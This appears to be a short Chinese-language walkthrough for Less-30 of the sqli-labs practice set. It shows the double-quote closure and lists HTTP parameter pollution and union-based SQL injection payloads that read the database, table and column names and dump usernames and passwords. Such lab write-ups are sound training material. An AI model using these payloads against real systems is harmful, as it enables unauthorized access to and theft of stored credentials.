---
title: less30
url: https://www.yuque.com/u29002979/ep2zrx/zyusq4qg670kl2g0
---

```bash
$id = '"' .$id. '"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";

$id = '"' .$id. '"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

与Less29的区别为闭合方式为双引号"

> This Site Protected by Worlds Best WAF
> 本网站受世界最佳WAF保护

`?id=1&id=1" and 1="1`闭合
双引号闭合

<a name="ohpIT"></a>

# HTTP参数污染

<a name="iQW9u"></a>

## 联合查询

> **?id=1\&id=0"**

```bash
查看当前数据库名称
?id=1'&id=0" union select 1,2,(select database()) --+

查看数据表名称
?id=1'&id=0" union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+

爆破字段名称
?id=1&id=0" union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')--+

爆破字段内容 
?id=1&id=0" union select 1,2,(select group_concat(username,0x7e,password)from security.users )--+
```
